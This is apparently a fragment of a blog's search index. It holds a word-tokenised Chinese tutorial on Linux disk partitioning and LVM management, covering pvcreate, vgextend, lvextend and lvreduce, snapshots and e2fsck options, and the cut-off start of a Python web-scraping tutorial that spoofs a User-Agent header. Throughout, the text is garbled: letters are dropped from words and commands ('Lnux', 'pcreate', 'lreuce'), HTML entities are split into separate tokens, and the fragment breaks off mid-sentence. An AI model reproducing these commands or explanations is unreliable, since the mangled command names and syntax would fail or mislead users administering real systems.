","GB","s","set","Comman","(","m","for","help",")",":","t","#","做","LVM","管理","，","需要","修改","分区","类型","为","Lnux","LVMPartton","number","(","1",",","2",",","efault","2",")",":","1","Hex","coe","(","type","L","to","lst","all","coes",")",":","8","eChange","type","of","partton","'","Lnux","'","to","'","Lnux","LVM","'","Comman","(","m","for","help",")",":","tPartton","number","(","1",",","2",",","efault","2",")",":","Hex","coe","(","type","L","to","lst","all","coes",")",":","8","eChange","type","of","partton","'","Lnux","'","to","'","Lnux","LVM","'","Comman","(","m","for","help",")",":","pDsk","esb",":","21.5","GB",",","21474836480","bytes",",","41943040","sectorsUnts","=","sectors","of","1","*","512","=","512","bytesSector","sze","(","logcalphyscal",")",":","512","bytes","512","bytesIO","sze","(","mnmumoptmal",")",":","512","bytes","512","bytesDsk","label","type",":","osDsk","entfer",":","0","xb","7","ee","3","c","1","b","Dece","Boot","Start","En","Blocks","I","Systemesb","1","2048","10487807","5242880","8","e","Lnux","LVMesb","2","10487808","41943039","15727616","8","e","Lnux","LVMComman","(","m","for","help",")",":","w","#","保存","分区","信息","The","partton","table","has","been","altere","!","#","更新","内核","分区表","[","root@noe1","~","]","#","partprobe","esb","[","root@noe1","~","]","#","ls","esb","*","esb","esb","1","esb","2","第二块","磁盘","sc","的","分区","：","创建","一个","主","分区","和","一个","逻辑","分区","，","用来","测试","扩展","分区","和","逻辑","分区","是否","能够","创建","PV","物理","卷","并","加入","VG","卷","组","，","实验","证明","，","扩展","分区","是","无法","创建","PV","和","加入","VG","，","主","分区","和","逻辑","分区","可以","。","[","root@noe1","~","]","#","fsk","escWelcome","to","fsk","(","utl","-","lnux","2.23.2",")",".","Comman","(","m","for","help",")",":","nPartton","type",":","p","prmary","(","0","prmary",",","0","extene",",","4","free",")","e","exteneSelect","(","efault","p",")",":","p","#","主","分区","Usng","efault","response","pPartton","number","(","1","-","4",",","efault","1",")",":","Frst","sector","(","2048","-","41943039",",","efault","2048",")",":","Usng","efault","alue","2048","Last","sector",",","+","sectors","or","+","sze","&","#","123",";","K",",","M",",","G","&","#","125",";","(","2048","-","41943039",",","efault","41943039",")",":","+","5","GPartton","1","of","type","Lnux","an","of","sze","5","GB","s","setComman","(","m","for","help",")",":","nPartton","type",":","p","prmary","(","1","prmary",",","0","extene",",","3","free",")","e","extene","#","扩展","分区","，","要","创建","扩展","分区","之后","，","才能","创建","逻辑","分区","；","#","扩展","分区","只能","创建","一个","，","分区表","支持","创建","最多","四分","主","分区","，","#","如果","想要","创建","4个","以上","的","分区","，","必须","创建","扩展","分区","，","然后","创建","逻辑","分区","Select","(","efault","p",")",":","ePartton","number","(","2","-","4",",","efault","2",")",":","Frst","sector","(","10487808","-","41943039",",","efault","10487808",")",":","Usng","efault","alue","10487808","Last","sector",",","+","sectors","or","+","sze","&","#","123",";","K",",","M",",","G","&","#","125",";","(","10487808","-","41943039",",","efault","41943039",")",":","Usng","efault","alue","41943039","Partton","2","of","type","Extene","an","of","sze","15","GB","s","setComman","(","m","for","help",")",":","nPartton","type",":","p","prmary","(","1","prmary",",","1","extene",",","2","free",")","l","logcal","(","numbere","from","5",")","Select","(","efault","p",")",":","l","#","创建","逻辑","分区","Ang","logcal","partton","5","Frst","sector","(","10489856","-","41943039",",","efault","10489856",")",":","Usng","efault","alue","10489856","Last","sector",",","+","sectors","or","+","sze","&","#","123",";","K",",","M",",","G","&","#","125",";","(","10489856","-","41943039",",","efault","41943039",")",":","Usng","efault","alue","41943039","Partton","5","of","type","Lnux","an","of","sze","15","GB","s","setComman","(","m","for","help",")",":","pDsk","esc",":","21.5","GB",",","21474836480","bytes",",","41943040","sectorsUnts","=","sectors","of","1","*","512","=","512","bytesSector","sze","(","logcalphyscal",")",":","512","bytes","512","bytesIO","sze","(","mnmumoptmal",")",":","512","bytes","512","bytesDsk","label","type",":","osDsk","entfer",":","0","x","313","b","8","a","59","Dece","Boot","Start","En","Blocks","I","Systemesc","1","2048","10487807","5242880","83","Lnuxesc","2","10487808","41943039","15727616","5","Exteneesc","5","10489856","41943039","15726592","83","LnuxComman","(","m","for","help",")",":","t","#","修改","分区","类型","Partton","number","(","1",",","2",",","5",",","efault","5",")",":","1","Hex","coe","(","type","L","to","lst","all","coes",")",":","8","eChange","type","of","partton","'","Lnux","'","to","'","Lnux","LVM","'","Comman","(","m","for","help",")",":","tPartton","number","(","1",",","2",",","5",",","efault","5",")",":","5","Hex","coe","(","type","L","to","lst","all","coes",")",":","8","eChange","type","of","partton","'","Lnux","'","to","'","Lnux","LVM","'","Comman","(","m","for","help",")",":","pDsk","esc",":","21.5","GB",",","21474836480","bytes",",","41943040","sectorsUnts","=","sectors","of","1","*","512","=","512","bytesSector","sze","(","logcalphyscal",")",":","512","bytes","512","bytesIO","sze","(","mnmumoptmal",")",":","512","bytes","512","bytesDsk","label","type",":","osDsk","entfer",":","0","x","313","b","8","a","59","Dece","Boot","Start","En","Blocks","I","Systemesc","1","2048","10487807","5242880","8","e","Lnux","LVMesc","2","10487808","41943039","15727616","5","Exteneesc","5","10489856","41943039","15726592","8","e","Lnux","LVMComman","(","m","for","help",")",":","w","#","保存","分区表","信息","The","partton","table","has","been","altere","!","[","root@noe1","~","]","#","partprobe","esc","[","root@noe1","~","]","#","ls","-","l","esc","*","brw","-","rw","-","-","-","-","1","root","sk","8",",","32","Dec","25","06",":","31","escbrw","-","rw","-","-","-","-","1","root","sk","8",",","33","Dec","25","06",":","31","esc","1","brw","-","rw","-","-","-","-","1","root","sk","8",",","34","Dec","25","06",":","31","esc","2","brw","-","rw","-","-","-","-","1","root","sk","8",",","37","Dec","25","06",":","31","esc","5","创建","PV","、","VG","、","LV","报","错","[","root@noe1","~","]","#","pcreate","esb","1","Can","'","t","open","esb","1","exclusely",".","Mounte","flesystem","?","Can","'","t","open","esb","1","exclusely",".","Mounte","flesystem","?","可以","尝试","修改","配置","文件","：","etclmlm",".","conf","创建","物理","卷","PV","[","root@localhost","~","]","#","pcreate","esc","2","#","sc","2","是","扩展","分区","，","无法","做成","物理","卷","PV","Dece","esc","2","not","foun","(","or","gnore","by","flterng",")",".","[","root@noe1","~","]","#","pcreate","esb","1","#","把","sb","1","做成","物理","卷","PV","，","也","可以","用","下面","的","写法","，","一次性","把","所有","主","分区","或","逻辑","分区","做成","物理","卷","PV","Physcal","olume","\"","esb","1","\"","successfully","create",".","[","root@noe1","~","]","#","pcreate","esb","2","esc","1","esc","5","Physcal","olume","\"","esb","2","\"","successfully","create",".","Physcal","olume","\"","esc","1","\"","successfully","create",".","Physcal","olume","\"","esc","5","\"","successfully","create",".","[","root@noe1","~","]","#","ps","#","显示","所","有的","物理","卷","PV","VG","Fmt","Attr","PSze","PFree","esa","2","centos","lm","2","a","-","-","19.00","g","0","esb","1","lm","2","-","-","-","5.00","g","5.00","g","esb","2","lm","2","-","-","-","15.00","g","15.00","g","esc","1","lm","2","-","-","-","5.00","g","5.00","g","esc","5","lm","2","-","-","-","15.00","g","15.00","g","创建","卷","组","VG","#","创建","卷","组","1","，","卷","组","的","PV","物理","卷","，","可以","是","不同","磁盘","，","即","整合","了","所有","磁盘分区","做成","资源","池","[","root@noe1","~","]","#","gcreate","V","1","&","#","x","2","F",";","e","&","#","x","2","F",";","sb","1","&","#","x","2","F",";","e","&","#","x","2","F",";","sc","1","Volume","group","&","quot",";","V","1","&","quot",";","successfully","create","[","root@noe1","~","]","#","gcreate","V","2","&","#","x","2","F",";","e","&","#","x","2","F",";","sb","2","&","#","x","2","F",";","e","&","#","x","2","F",";","sc","5","Volume","group","&","quot",";","V","2","&","quot",";","successfully","create","[","root@noe1","~","]","#","gs","VG","#","PV","#","LV","#","SN","Attr","VSze","VFree","V","1","2","0","0","wz","-","-","n","-","9.99","g","9.99","g","V","2","2","0","0","wz","-","-","n","-","29.99","g","29.99","g","centos","1","2","0","wz","-","-","n","-","19.00","g","0","创建","逻辑","卷","l","#","-","n","表示","创建","逻辑","卷","名","，","-","L","表示","分配","逻辑","卷","的","空间","大小","，","VG","1","表示","在","卷","组","VG","1","上","创建","逻辑","卷","LVtest","1","[","root@noe1","~","]","#","lcreate","-","n","LV","1","-","L","1","G","V","1","Logcal","olume","\"","LV","1","\"","create",".","[","root@noe1","~","]","#","lcreate","-","n","LV","2","-","L","1","G","V","2","Logcal","olume","\"","LV","2","\"","create",".","[","root@noe1","~","]","#","ls","LV","VG","Attr","LSze","Pool","Orgn","Data","%","Meta","%","Moe","Log","Cpy","%","Sync","Conert","LV","1","V","1","-","w","-","a","-","-","-","-","-","1.00","g","LV","2","V","2","-","w","-","a","-","-","-","-","-","1.00","g","root","centos","-","w","-","ao","-","-","-","-","17.00","g","swap","centos","-","w","-","ao","-","-","-","-","2.00","g","[","root@noe1","~","]","#","ls","-","l","eV","1","total","0","lrwxrwxrwx","1","root","root","7","Dec","25","07",":","33","LV","1","-",".",".","m","-","2","格式化","逻辑","卷","LV","#","物理","卷","需要","格式化","之后","才能","使用","，","格式","化为","ext","4","格式","[","root@noe1","~","]","#","mke","2","fs","-","t","ext","4","eV","1","LV","1","mke","2","fs","1.42.9","(","28","-","Dec","-","2013",")","Flesystem","label","=","OS","type",":","LnuxBlock","sze","=","4096","(","log","=","2",")","Fragment","sze","=","4096","(","log","=","2",")","Stre","=","0","blocks",",","Strpe","wth","=","0","blocks","65536","noes",",","262144","blocks","13107","blocks","(","5.00%",")","resere","for","the","super","userFrst","ata","block","=","0","Maxmum","flesystem","blocks","=","2684354568","block","groups","32768","blocks","per","group",",","32768","fragments","per","group","8192","noes","per","groupSuperblock","backups","store","on","blocks",":","32768",",","98304",",","163840",",","229376","Allocatng","group","tables",":","one","Wrtng","noe","tables",":","one","Creatng","journal","(","8192","blocks",")",":","oneWrtng","superblocks","an","flesystem","accountng","nformaton",":","one","挂载","逻辑","卷","[","root@noe1","~","]","#","mkr","LG","[","root@noe1","~","]","#","mount","eV","1","LV","1","LG","[","root@noe1","~","]","#","f","-","hFlesystem","Sze","Use","Aal","Use","%","Mounte","onetmpfs","475","M","0","475","M","0%","etmpfs","487","M","0","487","M","0%","eshmtmpfs","487","M","7.6","M","479","M","2%","runtmpfs","487","M","0","487","M","0%","sysfscgroupemappercentos","-","root","17","G","2.1","G","15","G","12%","esa","1","1014","M","176","M","839","M","18%","boottmpfs","98","M","0","98","M","0%","runuser","0","emapperV","1","-","LV","1","976","M","2.6","M","907","M","1%","rootLG","#","永久","挂载","逻辑","卷","需要","在","etcfstab","中","设置","新","增加","一块","硬盘","，","并","将","这","块","磁盘","创建","PV","#","通知","系统","重新","搜索","磁盘","[","root@noe1","~","]","#","echo","\"","-","-","-","\"","sysclassscs","_","hosthost","0","scan","#","按照","之前","的","方法","，","将","es","分区","并","更改","格式","[","root@noe1","~","]","#","fsk","-","l","es","tal","-","n","2","Dece","Boot","Start","En","Blocks","I","Systemes","1","2048","10487807","5242880","8","e","Lnux","LVM","#","创建","物理","卷","PV","[","root@noe1","~","]","#","pcreate","es","1","Physcal","olume","\"","es","1","\"","successfully","create",".","#","扩展","VG","卷","组","容量","，","把","物理","卷","加入","卷","组","[","root@localhost","~","]","#","gexten","VG","1","es","1","[","root@noe1","~","]","#","echo","&","quot",";","ths","s","a","test","for","LVM","&","quot",";","LG","&","#","x","2","F",";","test","#","在","挂载","的","逻辑","卷","里","添加","数据","，","用来","测试","在","逻辑","卷","扩容","是否","会","破坏","原有","数据","[","root@noe1","~","]","#","cat","LG","&","#","x","2","F",";","test","ths","s","a","test","for","LVM","#","扩容","逻辑","卷","LV","1","，","增加","2","G","空间","容量","（","从","对应","的","卷","组","中","划分","空间","容量","）","[","root@noe1","~","]","#","lexten","-","L","+","2","G","&","#","x","2","F",";","e","&","#","x","2","F",";","V","1","&","#","x","2","F",";","LV","1","Sze","of","logcal","olume","V","1","&","#","x","2","F",";","LV","1","change","from","1.00","GB","(","256","extents",")","to","3.00","GB","(","768","extents",")",".","Logcal","olume","V","1","&","#","x","2","F",";","LV","1","successfully","resze",".","[","root@noe1","~","]","#","ls","LV","VG","Attr","LSze","Pool","Orgn","Data","%","Meta","%","Moe","Log","Cpy","%","Sync","Conert","LV","1","V","1","-","w","-","ao","-","-","-","-","3.00","g","LV","2","V","2","-","w","-","a","-","-","-","-","-","1.00","g","root","centos","-","w","-","ao","-","-","-","-","17.00","g","swap","centos","-","w","-","ao","-","-","-","-","2.00","g","#","使用","resze","2","fs","命令","来","进行","确认","增加","容量","，","前面","的","步骤","只","是","初步","分配","，","还","不能","实际","使用","，","#","需要","此","步骤","来","确定","实际","分配","使用","[","root@noe1","~","]","#","resze","2","fs","&","#","x","2","F",";","e","&","#","x","2","F",";","V","1","&","#","x","2","F",";","LV","1","resze","2","fs","1.42.9","(","28","-","Dec","-","2013",")","Flesystem","at","&","#","x","2","F",";","e","&","#","x","2","F",";","V","1","&","#","x","2","F",";","LV","1","s","mounte","on","&","#","x","2","F",";","root","&","#","x","2","F",";","LG",";","on","-","lne","reszng","requreol","_","esc","_","blocks","&","#","x","3","D",";","1",",","new","_","esc","_","blocks","&","#","x","3","D",";","1","The","flesystem","on","&","#","x","2","F",";","e","&","#","x","2","F",";","V","1","&","#","x","2","F",";","LV","1","s","now","786432","blocks","long",".","#","xfs","系统","确认","实际","使用","的","命令","#","xfs","_","growfs","&","#","x","2","F",";","e","&","#","x","2","F",";","VGtest","1","&","#","x","2","F",";","LVtest","1","#","数据","并没有","受损","[","root@noe1","~","]","#","cat","LG","&","#","x","2","F",";","test","ths","s","a","test","for","LVM","缩减","逻辑","卷","缩减","逻辑","卷","的","注意事项","：","1","、","查看","逻辑","卷","使用","空间","状况","2","、","不能","在线","缩减","，","得","先","卸载","切记","3","、","确保","缩减","后","的","空间","大小","依然","能","存储","原","有的","所有","数据","4","、","在","缩减","之前","应该","先","强行","检查","文件","，","以","确保","文件系统","处于","一","至","性状","态","#","处于","挂载","状态","的","LV","逻辑","卷","无法","强制","检查","[","root@noe1","~","]","#","umount","&","#","x","2","F",";","e","&","#","x","2","F",";","V","1","&","#","x","2","F",";","LV","1","[","root@noe1","~","]","#","e","2","fsck","-","f","&","#","x","2","F",";","e","&","#","x","2","F",";","V","1","&","#","x","2","F",";","LV","1","e","2","fsck","1.42.9","(","28","-","Dec","-","2013",")","Pass","1",":","Checkng","noes",",","blocks",",","an","szesPass","2",":","Checkng","rectory","structurePass","3",":","Checkng","rectory","connecttyPass","4",":","Checkng","reference","countsPass","5",":","Checkng","group","summary","nformaton","&","#","x","2","F",";","e","&","#","x","2","F",";","V","1","&","#","x","2","F",";","LV","1",":","12","&","#","x","2","F",";","196608","fles","(","0.0%","non","-","contguous",")",",","21309","&","#","x","2","F",";","786432","blocks","#","首先","需要","确定","缩减","逻辑","卷","到","多大","空间","容量","，","-","1","G","表示","缩减","1","G","大小","，","1","G","表示","缩减","至","1","G","，","再","进行","逻辑","卷","LV","容量","缩减","[","root@noe1","~","]","#","lreuce","-","L","1","G","&","#","x","2","F",";","e","&","#","x","2","F",";","V","1","&","#","x","2","F",";","LV","1","WARNING",":","Reucng","acte","logcal","olume","to","1.00","GB",".","THIS","MAY","DESTROY","YOUR","DATA","(","flesystem","etc",".",")","Do","you","really","want","to","reuce","V","1","&","#","x","2","F",";","LV","1","?","[","y","&","#","x","2","F",";","n","]",":","y","Sze","of","logcal","olume","V","1","&","#","x","2","F",";","LV","1","change","from","3.00","GB","(","768","extents",")","to","1.00","GB","(","256","extents",")",".","Logcal","olume","V","1","&","#","x","2","F",";","LV","1","successfully","resze",".","#","之后","需要","重新","挂载","逻辑","卷","缩减","磁盘空间","发现","物理","磁盘空间","使用","不足","，","将","其中","一块","硬盘","或","分区","拿掉","，","避免","磁盘","浪费","1","、","pmoe","esb","1","#","将","esb","1","上","存储","的","数据","移到","其它","物理","卷","中","2","、","greuce","VGtest","esb","1","#","将","esb","1","从","VGtest","卷","组","中","移","除","3","、","premoe","esb","1","#","将","esb","1","从","物理","卷","上移","除","[","root@noe1","~","]","#","ps","PV","VG","Fmt","Attr","PSze","PFree","&","#","x","2","F",";","e","&","#","x","2","F",";","sa","2","centos","lm","2","a","-","-","19.00","g","0","&","#","x","2","F",";","e","&","#","x","2","F",";","sb","1","V","1","lm","2","a","-","-","5.00","g","4.00","g","&","#","x","2","F",";","e","&","#","x","2","F",";","sb","2","V","2","lm","2","a","-","-","15.00","g","14.00","g","&","#","x","2","F",";","e","&","#","x","2","F",";","sc","1","V","1","lm","2","a","-","-","5.00","g","5.00","g","&","#","x","2","F",";","e","&","#","x","2","F",";","sc","5","V","2","lm","2","a","-","-","15.00","g","15.00","g","&","#","x","2","F",";","e","&","#","x","2","F",";","s","1","lm","2","-","-","-","5.00","g","5.00","g","#","把","sb","1","磁盘分区","的","数据","转移","到","其它","磁盘","上","[","root@noe1","~","]","#","pmoe","&","#","x","2","F",";","e","&","#","x","2","F",";","sb","1","&","#","x","2","F",";","e","&","#","x","2","F",";","sb","1",":","Moe",":","43.36%","&","#","x","2","F",";","e","&","#","x","2","F",";","sb","1",":","Moe",":","100.00%","#","把","分区","sb","1","从","VG","卷","组","中","移","除","[","root@noe1","~","]","#","greuce","V","1","&","#","x","2","F",";","e","&","#","x","2","F",";","sb","1","Remoe","&","quot",";","&","#","x","2","F",";","e","&","#","x","2","F",";","sb","1","&","quot",";","from","olume","group","&","quot",";","V","1","&","quot",";","#","把","sb","1","分区","从","PV","物理","卷","中","释放","出来","[","root@noe1","~","]","#","premoe","&","#","x","2","F",";","e","&","#","x","2","F",";","sb","1","Labels","on","physcal","olume","&","quot",";","&","#","x","2","F",";","e","&","#","x","2","F",";","sb","1","&","quot",";","successfully","wpe",".","[","root@noe1","~","]","#","cat","LG","&","#","x","2","F",";","testcat",":","LG","&","#","x","2","F",";","test",":","No","such","fle","or","rectory","#","如果","磁盘","划分","了","多","个","分区","，","做成","多","个","物理","卷","加入","了","卷","组","，","那么","可以","能","重复","以上","步骤","，","把","所","有的","空间","都","从","卷","组","和","物理","卷","中","释放","，","然后","可以","拿走","这","块","磁盘","做","它","用","重新","把","esb","1","加入","到","V","1","中","[","root@noe1","~","]","#","pcreate","&","#","x","2","F",";","e","&","#","x","2","F",";","sb","1","Physcal","olume","&","quot",";","&","#","x","2","F",";","e","&","#","x","2","F",";","sb","1","&","quot",";","successfully","create",".","[","root@noe1","~","]","#","gs","VG","#","PV","#","LV","#","SN","Attr","VSze","VFree","V","1","1","1","0","wz","-","-","n","-","5.00","g","4.00","g","V","2","2","1","0","wz","-","-","n","-","29.99","g","28.99","g","centos","1","2","0","wz","-","-","n","-","19.00","g","0","[","root@noe1","~","]","#","gexten","V","1","&","#","x","2","F",";","e","&","#","x","2","F",";","sb","1","Volume","group","&","quot",";","V","1","&","quot",";","successfully","extene","LVM","快照","[","root@noe1","LG","]","#","f","-","hFlesystem","Sze","Use","Aal","Use","%","Mounte","onetmpfs","475","M","0","475","M","0%","&","#","x","2","F",";","etmpfs","487","M","0","487","M","0%","&","#","x","2","F",";","e","&","#","x","2","F",";","shmtmpfs","487","M","7.7","M","479","M","2%","&","#","x","2","F",";","runtmpfs","487","M","0","487","M","0%","&","#","x","2","F",";","sys","&","#","x","2","F",";","fs","&","#","x","2","F",";","cgroup","&","#","x","2","F",";","e","&","#","x","2","F",";","mapper","&","#","x","2","F",";","centos","-","root","17","G","2.1","G","15","G","12%","&","#","x","2","F",";","&","#","x","2","F",";","e","&","#","x","2","F",";","sa","1","1014","M","176","M","839","M","18%","&","#","x","2","F",";","boottmpfs","98","M","0","98","M","0%","&","#","x","2","F",";","run","&","#","x","2","F",";","user","&","#","x","2","F",";","0","&","#","x","2","F",";","e","&","#","x","2","F",";","mapper","&","#","x","2","F",";","V","1","-","LV","1","976","M","2.6","M","907","M","1%","&","#","x","2","F",";","appata","#","利用","LV","1","逻辑","卷","，","快照","形成","一个","备份","的","物理","卷","BackUp","（","逻辑","卷","快照","功能","）","[","root@noe1","LG","]","#","lcreate","-","L","20","M","-","n","BackUp","-","s","-","p","r","&","#","x","2","F",";","e","&","#","x","2","F",";","V","1","&","#","x","2","F",";","LV","1","Logcal","olume","&","quot",";","BackUp","&","quot",";","create",".","[","root@noe1","LG","]","#","ls","LV","VG","Attr","LSze","Pool","Orgn","Data","%","Meta","%","Moe","Log","Cpy","%","Sync","Conert","LV","1","V","1","ow","-","aos","-","-","-","1.00","g","thrBack","V","1","sr","-","aos","-","-","-","20.00","m","LV","1","0.06","LV","2","V","2","-","w","-","a","-","-","-","-","-","1.00","g","root","centos","-","w","-","ao","-","-","-","-","17.00","g","swap","centos","-","w","-","ao","-","-","-","-","2.00","g","[","root@noe1","LG","]","#","mkr","&","#","x","2","F",";","tmp","&","#","x","2","F",";","thrUp","[","root@noe1","LG","]","#","mount","&","#","x","2","F",";","e","&","#","x","2","F",";","V","1","&","#","x","2","F",";","thrBack","&","#","x","2","F",";","tmp","&","#","x","2","F",";","thrUp","&","#","x","2","F",";","#","把","快照","的","逻辑","卷","挂载","到","目录","上","mount",":","&","#","x","2","F",";","e","&","#","x","2","F",";","mapper","&","#","x","2","F",";","V","1","-","thrBack","s","wrte","-","protecte",",","mountng","rea","-","only","[","root@noe1","LG","]","#","cat","&","#","x","2","F",";","tmp","&","#","x","2","F",";","thrUp","&","#","x","2","F",";","lm","ths","s","the","LVM","test","删除","LVM","快照","[","root@noe1","~","]","#","lremoe","&","#","x","2","F",";","e","&","#","x","2","F",";","V","1","&","#","x","2","F",";","backupDo","you","really","want","to","remoe","acte","logcal","olume","V","1","&","#","x","2","F",";","backup","?","[","y","&","#","x","2","F",";","n","]",":","y","Logcal","olume","&","quot",";","backup","&","quot",";","successfully","remoe","知识","扩展","知识","扩展","resze","2","fs","命令","resze","2","fs","命令","被","用来","增大","或者","收缩","未","加载","的","“","ext","2","&","#","x","2","F",";","ext","3","”","文件系统","的","大小","。","如果","文件系统","是","处于","mount","状态","下","，","那么","它","只能","做到","扩容","，","前提条件","是","内核","支持","在线","resze","。","，","lnux","kernel","2.6支","持","在","mount","状态","下","扩容","但","仅","限于","ext","3","文件系统","。","-","：","打开","调试","特性","；","-","p","：","打印","已","完成","的","百分比","进度条","；","-","f","：","强制执行","调整","大小","操作","，","覆盖","掉","安全","检查","操作","；","-","F","：","开始","执行","调整","大小","前","，","刷新","文件系统","设备","的","缓冲区","如果","是","xfs","文件系统","，","则","需要","使用","xfs","_","growfs","命令","e","2","fsck","命令","e","2","fsck","是","检查","ext","2","、","ext","3","、","ext","4","等","文件系统","的","正确性","。","补充","说明","：","e","2","fsck","执行","后","的","传回","值","及","代表","意义","如下","：","0","没有","任何","错误","发生","。","1","文件系统","发生","错误","，","并且","已经","修正","。","2","文件系统","发生","错误","，","并且","已经","修正","。","4","文件系统","发生","错误","，","但","没有","修正","。","8","运作","时","发生","错误","。","16","使用","的","语法","发生","错误","。","128","共享","的","函数库","发生","错误","。","参","数","：","-","a","不","询问","使用者","意见","，","便","自动","修复","文件系统","。","-","b","superblock","指定","superblock","，","而","不","使用","预设","的","superblock","。","-","B","区块","大小","指定","区块","的","大小","，","单位","为","字节","。","-","c","一并","执行","bablocks","，","以","标示","损坏","的","区块","。","-","C","将","检查","过程","的","信息","完整","记录","在","fle","escrptor","中","，","使得","整个","检查","过程","都","能","完整","监控","。","-","显示","排","错","信息","。","-","f","即使","文件系统","没有","错误","迹象","，","仍","强制","地","检查","正确性","。","-","F","执行","前","先","清除","设备","的","缓冲区","。","-","l","文件","将","文件","中指","定","的","区块","加","到","损坏","区块","列表","。","-","L","文件","先","清除","损坏","区块","列表","，","再","将","文件","中指","定","的","区块","加","到","损坏","区块","列表","。","因此","损坏","区块","列表","的","区块","跟","文件","中指","定","的","区块","是","一样","的","。","-","n","以","只读","模式","开启","文件系统","，","并","采取","非","互动","方式","执行","，","所","有的","问题","对话","均","设置","以","&","quot",";","no","&","quot",";","回答","。","-","p","不","询问","使用者","意见","，","便","自动","修复","文件系统","。","-","r","此","参数","只","为了","兼容性","而","存在","，","并无","实际","作用","。","-","s","如果","文件系统","的","字节","顺序","不适当","，","就","交换","字节","顺序","，","否则","不做","任何","动作","。","-","S","不管","文件系统","的","字节","顺序","，","一律","交换","字节","顺序","。","-","t","显示","时间","信息","。","-","执行","时","显示","详细的","信息","。","-","V","显示","版本","信息","。","-","y","采取","非","互动","方式","执行","，","所","有的","问题","均","设置","以","&","quot",";","yes","&","quot",";","回答","。"],"url":"http://ymlog.cn/2019/12/25/Linux%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%82%A8/","title":"Linux系统存储","content":"磁盘管理磁盘设备根据接口进行命名，IDE接口的，以/dev/hd的形式命名。而SCSI、SATA、SAS、USB接口的，以sda,sdb,sdc的形式命名，不同的设备划分的名字从a-z。\nIDE的英文全称为“Integrated Dr...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/Linux/","name":"Linux"},"date":"2019-12-25 19:27:45"},{"word":["基本原理","爬虫","的","本质","是","：","程序","模拟","浏览器","，","对","服务器","发起","访问","(","requests","请求","过程",")","，","服务器","返回","响应","(","response","响应","过程",")","。","所以","，","一个","简单的","爬虫","只有","三步","：","构造","URL","对","服务器","发送","请求","输出","服务器","返回","内容","这里","用","一个","实例","，","运行","后","可以","看到","输出","了","百度","网页","的","源码","(","这里","就","不","演示","了",")","：","mport","requests","#","requests","是","python","爬虫","最","常用的","请求","库","url","=","'","http",":","www",".","bau",".","com","'","#","1","、","指名","要","访问","的","网站","response","=","requests",".","get","(","url",")","#","2","、","使用","requests","的","get","方法","请求","网站","信息","prnt","(","response",".","text",")","#","3","、","输出","响应","内容","所以","，","爬虫","也","都","围绕","这","三步","进行","。","1","、","构造","URL","，","就是","要爬","的","链接","2","、","发起","请求","3","、","解析","响应","内容","构造","URL","可能","有人","会","问","，","指定","URL","这么","简单","，","为","什么","也","要","写","，","这里","笔者","给出","一个","实例","说明","：","这是","东方","财富","网","的","腾讯","股票","页面","，","如果","我","想要","爬","取","这个","页面","的","评价","，","那么","我","就","需要","知道","评论","的","URL","。","这个","页面","有","94条","评论","地址","，","一共","有","196个","这样","的","页","，","也就是","我","需要","知道","至少","18",",","424","‬","个","URL","我","才能","把","腾讯","股票","所","有的","评率","全","部","爬下","来","，","这","显然","是","不现实","的","。","那么","我们","是","如何","知道","要爬","页面","的","URL","的","呢","？","答案","是","：","通过","网站","的","内部","逻辑","构造","URL","。","通过","Chrome","开发者","选项","可以","调出","如下","页面","，","指定","一条","评论","链接","，","我们","可以","看到","红","圈","画出","来","的","内容",":","`","news",",","usaapl",",","880272132",".","html","`","然后","我们","再","点","进去","，","看看","这个","站点","的","真正","链接","是什么","。","可以","看到","，","这个","站点","的","真正","链接","是",":","http",":","guba",".","eastmoney",".","comnews",",","usaapl",",","880272132",".","html","而","我们","之前","找","到了","news",",","usaapl",",","880272132",".","html","，","这个","站点","的","真正","链接","，","就是","在","这","段","之前","拼接","：","http",":","guba",".","eastmoney",".","com","。","所以","，","我们","只","需要","把","一开始","的","网站","爬下","来","，","然后","筛选","出","类似","news",",","usaapl",",","880272132",".","html","这样","的","内容","，","然后","再","把","它","和","http",":","guba",".","eastmoney",".","com","拼接","，","就","可以","得到","当前","页面","上","所有","评论","的","具体地址","，","这","就是","地址","构造","，","也就是","构造","URL","。","发起","请求","一个","爬虫","是否","能","成功","将","网页","爬下","来","，","完全","取决于","请求","。","现在","网络","上","绝大部分","的","网站","都","有了","反","爬","机制","，","能够","拦截","爬虫","。","这里","解释一下","为什么","要有","反","爬","。","爬虫","抓取","网页","就","相当于","用户","访问","网页","，","在","这","期间","，","浏览器","对","服务器","发起","了","一次","访问","。","如果","爬虫","大量","的","抓取","网页","，","比如","在","一分钟","之内","抓取","了","一万次","网页","，","那么","就","相当于","访问","了","服务器","一万次","，","这样","就","会","大量","的","占据","服务器","的","资源","，","甚至","大型","分布式","爬虫","会","使","服务器","崩溃","。","然而","，","人类","是","不可能","做到","10000次","mn","的","访问量","的","(","其实","相当于","一分钟","内","刷新","一个","网页","10000次",")","。","所以","，","越来越","多","的","网站","设计","了","反","爬","，","将","低","访问量","的","人和","高","访问量","的","爬虫","区别","开来","，","让","人","能够","正常","访问","，","而","爬虫","则","拒之门外","。","目前","主要","通过","以下","方式","实现","反","爬","：","识别","用户","的","User","-","Agent","使用","Ajax","请求","使用","JaaScrpt","渲染","内容","对","IP","进行","访问","控制","对","URL","进行","加密","处理","构造","复杂的","请求","头","(","往往","是","请求","头","需要","额外","添加","网站","的","其他","参数","，","这些","参数","分布","在","网站","的","隐蔽","角落","，","而且","几乎","毫无","逻辑",")","添加","请求","头","这里","笔者","给出","一个","豆瓣","电影","榜","的","例子","，","首先","用户","需要","先在","浏览器","中","找到","自己","浏览器","的","请求","头","，","具体","操作","如下","：","打开","浏览器","进入","开发者","模式","，","谷歌","浏览器","是","按","F","12","Ctrl","+","R","刷新","页面","选择","Network","的","选项","点击","右边","的","任意","一个","左边","选择","Heaers","，","下拉","可以","看到","User","-","Agent","将","其","复制","到","代码","中","即可","，","代码","如下","：","mport","requestsurl","=","'","https",":","moe",".","ouban",".","comchart","'","#","添加","请求","头","heaers","=","&","#","123",";","'","User","-","Agent","'",":","'","Mozlla","5.0","(","Wnows","NT","10.0",";","Wn","64",";","x","64",")","AppleWebKt","537.36","(","KHTML",",","lke","Gecko",")","Chrome","76.0.3809.132","Safar","537.36","'","&","#","125",";","response","=","requests",".","get","(","url",",","heaers","=","heaers",")","#","这里","要","把","请求","头","送入","到","请求","方法","中","prnt","(","response",".","text",")","绝大多数","网站","，","不","加","请求","头","，","往往","加载","不了","全部","网页","内容","。","添加","ataata","和","User","-","Agent","的","作用","类似","，","都是","用来","伪装","成","用户","的","。","服务器","会","根据","有没有","ata","和","user","-","agent","来","判断","是否","是","爬